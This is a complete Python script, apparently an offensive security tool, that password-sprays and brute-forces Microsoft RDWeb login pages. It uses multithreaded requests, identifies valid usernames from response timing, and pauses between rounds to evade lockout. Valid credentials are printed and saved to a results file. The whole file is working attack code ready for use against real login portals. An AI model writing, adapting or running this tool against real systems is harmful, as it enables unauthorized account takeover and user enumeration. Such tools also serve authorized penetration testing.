#!/usr/bin/env python

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from os.path import exists
from datetime import datetime
from sys import stdout
from time import sleep

requests.urllib3.disable_warnings() 

class BruteForcer:
    def __init__(self, url, path, domain, threads, timeout, validate):
        self.url = url
        self.path = path
        self.domain = domain
        self.threads = threads
        self.timeout = timeout
        self.validate = validate
        self.proxies = {
            # "https" : "http://127.0.0.1:8081"
        }
        self.headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type' : 'application/x-www-form-urlencoded'
        }
        self.usernames = []
        self.passwords = []
        self.valid_users = []
        self.valid_credentials = {}
        self.num_requests = 0
        self.total_requests = 0
        

    def make_request(self, username, password, current_request):
        """ Makes a request to the target endpoint and checks timeout threshold and login validation """

        _username = username.strip()
        _password = password.strip()

        data = {
            'DomainUserName' : f'{self.domain}\{_username}',
            'UserPass' : _password
        }

        request = requests.post(f'{self.url}{self.path}', data=data, proxies=self.proxies, headers=self.headers, verify=False, allow_redirects=False, timeout=30)

        if request.status_code == 302:
            print(f"[+] Login {_username}:{_password} is valid. (Recieved status code 302).")
            with open("rdweb_results.txt", "a") as f:
                f.write(f"[+] Login {_username}:{_password} is valid. (Recieved status code 302).")
            self.valid_credentials[_username] = _password
            self.usernames.remove(_username)
        # If we're under the timeout threshold, assume valid username
        elif request.status_code == 200 and request.elapsed.total_seconds() < self.timeout:
            if _username not in self.valid_users and self.validate:
                self.valid_users.append(_username)
                print(f"Username \"{_username}\" appears to be valid. Response time: {request.elapsed.total_seconds()}, Threshold: {self.timeout}")



    def print_valid_users(self):
        if self.valid_users:
            print("Identified valid usernames:")
            for user in self.valid_users:
                print(f"{user}")
            

    def print_credentials(self):
        if self.valid_credentials:
            print("Identified valid credentials:")
            for user in self.valid_credentials.keys():
                print(f"{user}:{self.valid_credentials[user]}")
                

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="Required. The target url. Example: https://rdweb.domain.com")
    parser.add_argument('-u', '--userfile', help="Required. The file containing usernames.")
    parser.add_argument('-p', '--passfile', help='Required. The password file.')
    parser.add_argument('-d', '--domain', help='Required. The target domain (internal)')
    parser.add_argument('-D', '--delay', help='The delay to be used between sprays, in minutes. Default = 0', default=0)
    parser.add_argument('-a', '--attempts', help='Attempts per delay. Default = Infinite', default=0)
    parser.add_argument('-T', '--threads', help='The number of threads. High values can result in false negatives. Default = 25.', default=25)
    parser.add_argument('-i', '--timeout', help='The timeout threshold in seconds indicating a success. Default = .5', default=.5)
    parser.add_argument('-P', '--path', help='The path to the RDWeb login page. Default = /RDWeb/Pages/en-US/login.aspx', default='/RDWeb/Pages/en-US/login.aspx')
    parser.add_argument('-n', '--no_validate', help='Switch. Suppresses username validation output.', action='store_true')

    args = parser.parse_args()

    if not args.target:
        print(f"Target is required!")
        parser.print_usage()
    elif not args.domain:
        print(f"Internal domain is required!")
        parser.print_usage()
    elif not args.userfile:
        print(f"Userfile is required!")
        parser.print_usage()
    elif not args.passfile:
        print(f"Passfile is required!")
        parser.print_usage()
    else:
        
        bf = BruteForcer(args.target, args.path, args.domain, args.threads, args.timeout, not args.no_validate)

        # read lines from user file
        if exists(args.userfile):
            with open(args.userfile, "r") as f:
                bf.usernames = f.readlines()
                bf.total_requests = len(bf.usernames)
                print(f"Read {len(bf.usernames)} user from userfile.")
        else:
            print(f"Userfile {args.userfile} does not exist. Exiting...")
            exit(1)
        
        # read lines from password file
        if exists(args.passfile):
            with open(args.passfile, "r") as f:
                bf.passwords = f.readlines()
                bf.total_requests = bf.total_requests * len(bf.passwords)
                print(f"Read {len(bf.passwords)} password from passfile.")
        else:
            print(f"Passfile {args.passfile} does not exist. Exiting...")
            exit(1)
        
        start_time = datetime.now()
        print(f"Brute forcing a total of {bf.total_requests} combinations.")

        # Create thread executor, setting threads to maximum specified from arguments
        with ThreadPoolExecutor(max_workers=int(bf.threads)) as executor:

            print(f'Starting brute forcing at {start_time}')

            # iterate through all username, password combinations
            attempts = 0
            for password in bf.passwords:


                # delay logic
                if args.attempts:

                    # if current attempts on each username = max attempts set by args, then sleep and clear 
                    if attempts >= int(args.attempts):
                        sleep(1)
                        bf.print_valid_users()
                        bf.print_credentials()
                        print(f"Delaying for {args.delay} minutes after {attempts} password round(s).", end='')
                        sleep(int(args.delay)*60) # seconds to minutes
                        attempts = 0
                print(f"Spraying users with password: {password}")
                for username in bf.usernames:

                    # track current request number for output
                    bf.num_requests += 1
                    
                    # submit thread worker to executor
                    executor.submit(
                        bf.make_request,
                        username,
                        password,
                        bf.num_requests
                        )

                # increment attempts after usernames have all been passed once      
                attempts += 1
                        
        print(f'Finished brute force. Total elapsed time: {datetime.now() - start_time}\n')
        bf.print_valid_users()
        print()
        bf.print_credentials()

